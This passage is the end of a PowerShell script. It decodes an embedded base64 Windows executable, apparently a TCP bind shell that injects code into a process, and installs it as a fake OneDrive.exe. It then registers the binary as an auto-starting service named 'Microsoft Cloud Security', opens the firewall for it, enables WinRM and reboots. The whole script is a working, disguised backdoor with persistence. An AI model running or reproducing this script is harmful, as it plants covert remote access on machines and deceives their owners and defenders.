MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMAGBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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"

[IO.File]::WriteAllBytes('C:\Program Files\Windows NT\OneDrive.exe', [Convert]::FromBase64String($tcp_bind))

# Create a service for the newly written binary

New-Service -Name "msftcloudsecurity" -BinaryPathName 'C:\Program Files\Windows NT\OneDrive.exe' -DisplayName "Microsoft Cloud Security" -StartupType Automatic

# Create a firewall rule for the binary

New-NetFirewallRule -DisplayName 'Microsoft Cloud Security' -Program "C:\Program Files\Windows NT\OneDrive.exe" -Action Allow


### ENABLE WINRM ###

Enable-PSRemoting -SkipNetworkProfileCheck -Force


### RESTART COMPUTER ###

Restart-Computer